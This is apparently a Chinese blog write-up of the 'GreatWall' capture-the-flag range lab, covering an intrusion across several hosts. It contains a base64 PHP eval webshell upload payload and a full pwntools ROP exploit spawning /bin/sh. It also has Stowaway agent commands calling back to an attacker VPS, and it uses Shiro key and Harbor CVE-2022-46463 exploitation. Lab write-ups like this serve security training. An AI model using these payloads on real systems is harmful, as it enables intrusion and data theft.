---
layout: config.default_layout
title: 春秋云镜-GreatWall
date: 2025-04-04 00:44:16
updated: 2025-04-04 00:44:58
comments: true
tags: [春秋云镜,Linux靶机,Windows靶机,综合靶场]
categories: 靶机
---

# GreatWall

> https://yunjing.ichunqiu.com/major/detail/1171?type=2
> 

![image.png](image34.png)

8.130.146.145

## 前期踩点

```bash
⚡ root@kali  ~/Desktop/test/greatwall  nmap -sT -min-rate 10000 -p- 8.130.146.145
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-29 08:56 EDT
Nmap scan report for 8.130.146.145
Host is up (0.012s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 19.87 seconds
```

访问`HTTP`服务，并提取指纹

![image.png](image35.png)

访问`8080`端口，是管理页面

![image.png](image36.png)

## WEB渗透 - 1

手动测试了以下弱密码等方法，但是根本没有将数据传过去，使用`fscan`扫描一波

```bash
⚡ root@kali  ~/Desktop/Tools  ./fscan_1.8.4 -h 8.130.146.145                                                                                                                                                                   

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
8.130.146.145:8080 open
8.130.146.145:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://8.130.146.145      code:200 len:10887  title:""
[*] WebTitle http://8.130.146.145:8080 code:200 len:1027   title:Login Form
[+] PocScan http://8.130.146.145:8080 poc-yaml-thinkphp5023-method-rce poc1
已完成 2/2
[*] 扫描结束,耗时: 23.801911592s
```

扫描出存在`ThinkPHP5`的RCE漏洞

![image.png](image37.png)

一键梭哈，点击`GETSHELL`

```bash
[+] http://8.130.146.145:8080/peiqi.php   Pass:peiqi
```

使用`AntSword`连接

![image.png](image38.png)

在根目录下能找到`Flag1` （一开始以为要提权）

```bash
(www-data:/) $ cat f1ag01_UdEv.txt
flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada}
```

## 内网信息收集 - 1

得知内网网段`172.28.23.x`

```bash
(www-data:/) $ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:0c:c8:c0 brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0
       valid_lft 315358799sec preferred_lft 315358799sec
    inet6 fe80::216:3eff:fe0c:c8c0/64 scope link 
       valid_lft forever preferred_lft forever
```

反弹`Shell`到`VPS`上，上传`fscan`进行扫描

```bash
www-data@portal:/var/www/html/background/public$ ./fscan -h 172.28.23.1/24
./fscan -h 172.28.23.1/24                
┌──────────────────────────────────────────────┐                   
│    ___                              _        │                                                                                                                                                              
│   / _ \     ___  ___ _ __ __ _  ___| | __    │                                                                                                                                                              
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │                                                 
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │                                                                                                                                                              
└──────────────────────────────────────────────┘                                                                                                                                                              
      Fscan Version: 2.0.0                                    
                                            
[2025-03-29 21:20:50] [INFO] 暴力破解线程数: 1
[2025-03-29 21:20:50] [INFO] 开始信息扫描
[2025-03-29 21:20:50] [INFO] CIDR范围: 172.28.23.0-172.28.23.255              
[2025-03-29 21:20:50] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING)
[2025-03-29 21:20:50] [INFO] 解析CIDR 172.28.23.1/24 -> IP范围 172.28.23.0-172.28.23.255
[2025-03-29 21:20:50] [INFO] 最终有效主机数量: 256
[2025-03-29 21:20:50] [INFO] 开始主机扫描
[2025-03-29 21:20:50] [INFO] 正在尝试无监听ICMP探测...
[2025-03-29 21:20:50] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-03-29 21:20:50] [INFO] 切换为PING方式探测...            
[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)
[2025-03-29 21:20:51] [SUCCESS] 目标 172.28.23.17    存活 (ICMP)
[2025-03-29 21:20:57] [INFO] 存活主机数量: 3                  
[2025-03-29 21:20:57] [INFO] 有效端口数量: 233
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.33:22                     
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:22
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:21
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:80
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:22
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.26:80
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.33:8080
[2025-03-29 21:20:57] [SUCCESS] 端口开放 172.28.23.17:8080
[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.33:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]    
[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.26:22 => [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]    
[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.26:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]                                                                               
[2025-03-29 21:20:57] [SUCCESS] 服务识别 172.28.23.17:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]      
[2025-03-29 21:21:02] [SUCCESS] 服务识别 172.28.23.33:8080 => [http]
[2025-03-29 21:21:02] [SUCCESS] 服务识别 172.28.23.17:8080 => [http]
[2025-03-29 21:21:03] [SUCCESS] 服务识别 172.28.23.17:80 => [http]
[2025-03-29 21:21:03] [SUCCESS] 服务识别 172.28.23.26:80 => [http]
[2025-03-29 21:21:03] [INFO] 存活端口数量: 8                              
[2025-03-29 21:21:03] [INFO] 开始漏洞扫描
[2025-03-29 21:21:03] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle
[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=FB1FB63C9EC9F3C16B00B0127DA0965D                  
[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413                                            
[2025-03-29 21:21:03] [SUCCESS] 匿名登录成功!   
[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:""
[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form                                                                                                     
[2025-03-29 21:21:03] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=FB1FB63C9EC9F3C16B00B0127DA0965D 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆                                         
[2025-03-29 21:21:04] [SUCCESS] 目标: http://172.28.23.17:8080
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1                              
  详细信息:                              
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
[2025-03-29 21:21:05] [SUCCESS] 目标: http://172.28.23.33:8080                                            
  漏洞类型: poc-yaml-spring-actuator-heapdump-file                                      
  漏洞名称:                                       
  详细信息:                              
        author:AgeloVito                              
        links:https://www.cnblogs.com/wyb628/p/8567610.html 
[2025-03-29 21:21:05] [SUCCESS] 目标: http://172.28.23.33:8080
  漏洞类型: poc-yaml-springboot-env-unauth                      
  漏洞名称: spring2                                             
  详细信息:                                                     
        links:https://github.com/LandGrey/SpringBootVulExploit
```

三台存活主机：172.28.23.26，172.28.23.33，172.28.23.17

并且`172.28.23.33`存在公开漏洞，可进行利用

## 一层代理搭建

使用`stowaway`

```bash
./linux_x64_admin -l 2087 -s 12
```

```bash
www-data@portal:/var/www/html/background/public$ ./linux_x64_agent -c <VPS-ip>:2087 -s 123 --reconnect 8                                                                                                 
<64_agent -c <VPS-ip>:2087 -s 123 --reconnect 8
2025/03/29 21:32:51 [*] Starting agent node actively.Connecting to <VPS-ip>:2087.Reconnecting every 8 seconds                                                                                            
```

在服务端设置`socks`代理

```bash
(admin) >> detail
Node[0] -> IP: 8.130.146.145:46344  Hostname: portal  User: www-data
Memo: 

(admin) >> use 0
(node 0) >> socks 8080 admin admin
[*] Trying to listen on 0.0.0.0:8080......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

进行测试，配置好`proxychains`

```bash
⚡ root@kali  ~/Desktop/Tools  proxychains4 curl http://172.28.23.33:8080/login                 
[proxychains] config file found: /etc/proxychains4.conf                                                           
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            
[proxychains] DLL init: proxychains-ng 4.17                                                                       
[proxychains] Strict chain  ...  <VPS-ip>:1080  ...  172.28.23.33:8080  ...  OK
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>                  
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <title>智联科技 ERP 后台登陆</title>           
  <link type="text/css" rel="stylesheet" href="/css/common.css" />
  <link type="text/css" rel="stylesheet" href="/css/style.css" />
  <link type="text/css" rel="stylesheet" href="/css/login.css" />
  .....
```

搭建成功

## 172.28.23.33 - ERP

### spring-actuator-heapdump

`172.28.23.33:8080` 有公开漏洞 `poc-yaml-spring-actuator-heapdump-file`

![image.png](image39.png)

将`heapdump` 文件下载下来

```bash
⚡ root@kali  ~/Desktop/Tools  proxychains4 wget http://172.28.23.33:8080/actuator/heapdump
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
--2025-03-29 09:50:18--  http://172.28.23.33:8080/actuator/heapdump
正在连接 172.28.23.33:8080... [proxychains] Strict chain  ...  <VPS-ip>:1080  ...  172.28.23.33:8080  ...  OK
已连接。
已发出 HTTP 请求，正在等待回应... 200 
长度：28261428 (27M) [application/octet-stream]
正在保存至: “heapdump”

heapdump                                                 100%[==================================================================================================================================>]  26.95M  6.20MB/s  用时 4.0s    

2025-03-29 09:50:23 (6.77 MB/s) - 已保存 “heapdump” [28261428/28261428])
```

使用`JDumpSpider`来读取敏感信息

工具链接：https://github.com/whwlsfb/JDumpSpider

可以读到`Shiro`的信息，并将其密钥读出来了

```bash
⚡ root@kali  ~/Desktop/test/greatwall  java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                     
===========================================                                                                                                                                                                                         
CookieRememberMeManager(ShiroKey)                                                                                                                                                                                                   
-------------                                                                                                                                                                                                                       
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES                                                                                                                                                                        
```

工具梭哈

![image.png](image40.png)

注入内存马

![image.png](image41.png)

使用冰蝎进行连接

![image.png](image42.png)

### 59696 端口

在根目录下没找到`flag`文件，应该是要提权了

开启了一个很奇怪的端口`59696` 

```bash
/ >ss -tulpn

Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0      0           127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0      0       172.28.23.33%eth0:68           0.0.0.0:*            
udp   UNCONN 0      0               127.0.0.1:323          0.0.0.0:*            
udp   UNCONN 0      0                   [::1]:323             [::]:*            
tcp   LISTEN 0      64                0.0.0.0:59696        0.0.0.0:*            
tcp   LISTEN 0      4096        127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0      128               0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0      100                     *:8080               *:*     users:(("java",pid=667,fd=27))
```

需要进行验证

```bash
 ⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q nc 172.28.23.33 59696
Connection established!
Server time: Sat Mar 29 22:10:58 2025

Username: 1
Password: 2

Unauthorized
```

在用户家目录发现`HashNote`，就是`59696`端口运行的程序

![image.png](image43.png)

下载，使用`IDA`分析，不会逆向

![image.png](image44.png)

查看WP，得知是PWN（这些我是真的菜）

exp 如下（[https://www.dr0n.top/posts/f249db01/#智联科技-ERP-172-28-23-33](https://www.dr0n.top/posts/f249db01/#%E6%99%BA%E8%81%94%E7%A7%91%E6%8A%80-ERP-172-28-23-33)）：

```bash
from pwn import *
context.arch='amd64'

def add(key,data='b'):
    p.sendlineafter(b'Option:',b'1')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def show(key):
    p.sendlineafter(b'Option:',b'2')
    p.sendlineafter(b"Key: ",key);

def edit(key,data):
    p.sendlineafter(b'Option:',b'3')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def name(username):
    p.sendlineafter(b'Option:',b'4')
    p.sendlineafter(b'name:',username)

p = remote('172.28.23.33', 59696)
# p = process('./HashNote')

username=0x5dc980
stack=0x5e4fa8
ukey=b'\x30'*5+b'\x31'+b'\x44'

fake_chunk=flat({
    0:username+0x10,
    0x10:[username+0x20,len(ukey),\
        ukey,0],
    0x30:[stack,0x10]
    },filler=b'\x00')

p.sendlineafter(b'name',fake_chunk)
p.sendlineafter(b'word','freep@ssw0rd:3')

add(b'\x30'*1+b'\x31'+b'\x44',b'test')   # 126
add(b'\x30'*2+b'\x31'+b'\x44',b'test')   # 127

show(ukey)
main_ret=u64(p.read(8))-0x1e0

rdi=0x0000000000405e7c # pop rdi ; ret
rsi=0x000000000040974f # pop rsi ; ret
rdx=0x000000000053514b # pop rdx ; pop rbx ; ret
rax=0x00000000004206ba # pop rax ; ret
syscall=0x00000000004560c6 # syscall

fake_chunk=flat({
    0:username+0x20,
    0x20:[username+0x30,len(ukey),\
        ukey,0],
    0x40:[main_ret,0x100,b'/bin/sh\x00']
    },filler=b'\x00')

name(fake_chunk.ljust(0x80,b'\x00'))

payload=flat([
    rdi,username+0x50,
    rsi,0,
    rdx,0,0,
    rax,0x3b,
    syscall
    ])

p.sendlineafter(b'Option:',b'3')
p.sendlineafter(b'Key:',ukey)
p.sendline(payload)
p.sendlineafter(b'Option:',b'9')
p.interactive()
```

```bash
(pycryptodome)  ⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q python exp.py
[+] Opening connection to 172.28.23.33 on port 59696: Done
/root/Desktop/test/greatwall/exp.py:39: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(b'word','freep@ssw0rd:3')
[*] Switching to interactive mode
 Invalid!$  
```

`root`目录下存在`flag03`

```bash
$ cat f1ag03.txt
flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
```

## 172.28.23.26 - 新翔OA

![image.png](image45.png)

之前`fscan`扫描的时候`FTP`是可以进行匿名登陆的

```bash
⚡ root@kali  ~/Desktop/test/greatwall  proxychains4 -q ftp 172.28.23.26
Connected to 172.28.23.26.
220 (vsFTPd 3.0.3)
Name (172.28.23.26:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
-rw-r--r--    1 0        0         7536672 Mar 23  2024 OASystem.zip
226 Directory send OK.
ftp> mget *
mget OASystem.zip [anpqy?]? yes
229 Entering Extended Passive Mode (|||38378|)
150 Opening BINARY mode data connection for OASystem.zip (7536672 bytes).
100% |***************************************************************************************************************************************************************************************|  7360 KiB    1.67 MiB/s    00:00 ETA
226 Transfer complete.
7536672 bytes received in 00:04 (1.67 MiB/s)
```

得到一个压缩包`OASystem.zip` 应该是要进行代码审计了（悲，心疼沙砾）

先不代码审计，通过搜索引擎来搜索公开漏洞，能找到在前台有个任意文件上传漏洞

漏洞出现在`uploadbase64.php`中：

```bash
 ⚡ root@kali  ~/Desktop/test/greatwall/OAsystem  cat uploadbase64.php 
<?php
/**
 * Description: PhpStorm.
 * Author: yoby
 * DateTime: 2018/12/4 18:01
 * Email:logove@qq.com
 * Copyright Yoby版权所有
 */
$img = $_POST['imgbase64'];
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
    $type = ".".$result[2];
    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
}
$img =  base64_decode(str_replace($result[1], '', $img));
@file_put_contents($path, $img);
exit('{"src":"'.$path.'"}');#    
```

只需满足`preg_match`条件就能上传，而且参数可控

payload：

```bash
data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWycxJ10pOw==
```

通过最后解码能解码成一句话木马`<?php @eval($_POST['1']);`

梭哈！

![image.png](image46.png)

测试一下木马是否能正常使用，正常

![image.png](image47.png)

AntSword连接

![image.png](image48.png)

在根目录能找到`flag02`

![image.png](image49.png)

但是发现不能读取，进到虚拟终端，发现回显都是`ret=127`

![image.png](image50.png)

这是被**`Disable Functions`** 给限制了

![image.png](image51.png)

刚好 AntSword 的插件能绕过`Disable Functions` 的限制

![image.png](image52.png)

我们在重新连接到插件上传的新马，但是测试连接时出现了返回数据为空

最后通过**`Backtrace UAF`** 能直接获得shell

![image.png](image53.png)

直接读取`flag02`发现还是不能读取，查看权限

```bash
(www-data:/) $ ls -al flag02.txt
-r--------   1 root root    51 Mar 14  2024 flag02.txt
```

发现需要提权，寻找`SUID`权限文件

```bash
(www-data:/) $ find / -perm -u=s -type f 2>/dev/null
/bin/fusermount
/bin/ping6
/bin/mount
/bin/su
/bin/ping
/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/staprun
/usr/bin/base32
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/s-nail/s-nail-privsep
```

发现`/usr/bin/base32` ，像是可以将文件以`base32`输出，尝试执行

```bash
(www-data:/) $ /usr/bin/base32 /flag02.txt
MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRD
EOD5BI======
```

`base32`解码得到`flag02`

```bash
⚡ root@kali  ~/Desktop/test/greatwall/OAsystem  echo "MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRDEOD5BI======" | base32 -d
flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}
```

这里想要进行反弹 `shell` ，但是发现通过`Backtrace UAF` 获得的终端没办法反弹，通过搜索引擎得知，环境中无法使用`post`的马，要使用`get`的马

新建一个`GET`的马

![image.png](image54.png)

修改`.antproxy.php`

![image.png](image55.png)

![image.png](image56.png)

## 二层代理搭建

通过antsword上传`stowaway`到`172.28.23.26`

通过一句话木马给予执行权限

```bash
http://172.28.23.26/upload/.antproxy.php?1=system('chmod %2Bx linux_x64_agent');
```

在`stowaway` 服务端的第一个node节点中开启`listen` 10000端口，也就是`172.28.23.17` 监听`10000`端口，等待`172.28.23.26` 来连接

```bash
(node 0) >> listen
[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you're controlling was started in the corresponding way!
[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!
[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1
[*] Please input the [ip:]<port> : 10000
[*] Waiting for response......
[*] Node is listening on 10000
```

通过一句话木马进行连接

```bash
http://172.28.23.26/upload/.antproxy.php?1=system('./linux_x64_agent -c 172.28.23.17:10000 -s 123 --reconnect 8');
```

`stowaway` 服务端接收到新节点

```bash
(admin) >>
[*] New node online! Node id is 1
(admin) >>
[*] Please use 'exit' to exit stowaway or use 'back' to return to parent panel
[*] Unknown Command!

        help                                                    Show help information
        detail                                                  Display connected nodes' detail
        topo                                                    Display nodes' topology
        use        <id>                                         Select the target node you want to use
        exit                                                    Exit Stowaway

(admin) >> detail
Node[0] -> IP: 8.130.146.145:46344  Hostname: portal  User: www-data
Memo:

Node[1] -> IP: 172.28.23.26:50314  Hostname: Null  User: Null
Memo:
```

通过新节点开启`socks`服务

```bash
(admin) >> use 1
(node 1) >> socks 1081 admin admin
[*] Trying to listen on 0.0.0.0:1081......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

## 内网信息收集 - 2

（这部分做麻烦了，不如在上一步做端口转发）

通过`Backtrace UAF` 获得的终端收集内网`IP`信息，`172.22.14.x/24` 是二层内网网段

```bash
(www-data:/var/www/html/OAsystem/upload) $ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:0c:c8:c9 brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe0c:c8c9/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:0c:c8:a0 brd ff:ff:ff:ff:ff:ff
    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe0c:c8a0/64 scope link 
       valid_lft forever preferred_lft forever
```

在通过`Backtrace UAF` 获得的终端进行`fscan`扫描

```bash
(www-data:/var/www/html/OAsystem/upload) $ ./fscan_1.8.4 -h 172.22.14.1-255 > 1.txt
```

```bash
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.14.6     is alive
(icmp) Target 172.22.14.37    is alive
(icmp) Target 172.22.14.46    is alive
[*] Icmp alive hosts len is: 3
172.22.14.46:80 open
172.22.14.46:22 open
172.22.14.37:22 open
172.22.14.6:80 open
172.22.14.6:22 open
172.22.14.6:21 open
172.22.14.37:10250 open
172.22.14.37:2379 open
[*] alive ports len is: 8
start vulscan
[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
[*] WebTitle http://172.22.14.6        code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
[+] InfoScan http://172.22.14.46       [Harbor] 
[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
[+] ftp 172.22.14.6:21:anonymous 
   [->]OASystem.zip
[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
```

## 172.22.14.46 - Harbor

访问，采集指纹

![image.png](image57.png)

上面 fscan 扫描出 `poc-yaml-swagger-ui-unauth` 应该是接口泄露

通过搜索引擎检索，发现是未授权访问，通过`GitHub`寻找利用：https://github.com/404tk/CVE-2022-46463

```bash
⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46                           
[*] API version used v2.0
[+] project/projectadmin
[+] project/portal
[+] library/nginx
[+] library/redis
[+] harbor/secret
```

`harbor/secret` 看着像是我们感兴趣的，`project/projectadmin`也像是，Dump下来

```bash
⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2
[+] Dumping : harbor/secret:latest
    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
/root/Desktop/test/greatwall/CVE-2022-46463/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.
  tf.extractall(f"{CACHE_PATH}{dir}/{name}")
    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49
    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653
```

```bash
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463  proxychains -q python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2
[+] Dumping : project/projectadmin:latest
    [+] Downloading : 63e9bbe323274e77e58d77c6ab6802d247458f784222fbb07a2556d6ec74ee05
/root/Desktop/test/greatwall/CVE-2022-46463/harbor.py:128: DeprecationWarning: Python 3.14 will, by default, filter extracted tar archives and reject files or modify their metadata. Use the filter argument to control this behavior.
  tf.extractall(f"{CACHE_PATH}{dir}/{name}")
    [+] Downloading : a1ae0db7d6c6f577c8208ce5b780ad362ef36e69d068616ce9188ac1cc2f80c6
    [+] Downloading : 70437571d98143a3479eaf3cc5af696ea79710e815d16e561852cf7d429736bd
    [+] Downloading : ae0fa683fb6d89fd06e238876769e2c7897d86d7546a4877a2a4d2929ed56f2c
    [+] Downloading : 90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c
```

分析`harbor/secret` 的镜像文件，能找到`flag05`

```bash
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest  ls
413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49
58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653
b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
build_history.txt
da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest  cd 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49 
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49  ls                                                                 
f1ag05_Yz1o.txt  run.sh
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/harbor_secret/latest/413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49  cat f1ag05_Yz1o.txt                                                
flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}# 
```

分析`project/projectadmin` 的镜像文件，能找到**`ProjectAdmin-0.0.1-SNAPSHOT.jar`** ，并且在`run.sh`中运行了

```bash
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c  cat run.sh                                                         
#!/bin/bash
sleep 1

# start
java -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar
/usr/bin/tail -f /dev/null#                                                                                                                                                                                                         
 ⚡ root@kali  ~/Desktop/test/greatwall/CVE-2022-46463/caches/project_projectadmin/latest/90d3d033513d61a56d1603c00d2c9d72a9fa8cfee799f3b1737376094b2f3d4c  ls -al app  
总计 28888
drwxrwxrwx 2 root root     4096 2024年 3月25日 .
drwxr-xr-x 7 root root     4096  3月29日 12:54 ..
-rwxrwxrwx 1 root root 29573051 2024年 3月25日 ProjectAdmin-0.0.1-SNAPSHOT.jar
```

将`ProjectAdmin-0.0.1-SNAPSHOT.jar`拿到`JD-gui`中反编译

![image.png](image58.png)

在spring配置文件中能找到数据库账号密码`root:My3q1i4oZkJm3` 

新建规则

![image.png](image59.png)

再通过`MDUT`进行连接

![image.png](image60.png)

直接梭哈

![image.png](image61.png)

读取`flag06`

```bash
flag{413ac6ad-1d50-47cb-9cf3-17354b751741}
```

## 172.22.14.37 - K8s

PS：K8S一点不会，看着WP打的

通过`fscan`扫描，`172.22.14.37`开启了10250端口，也就是`K8s`的端口（云安全方面）

通过上面的方法扫描一次`172.22.14.37` 的端口

```bash
(www-data:/var/www/html/OAsystem/upload) $ ./fscan_1.8.4 -h 172.22.14.37 -p 1-65535 > 1.txt
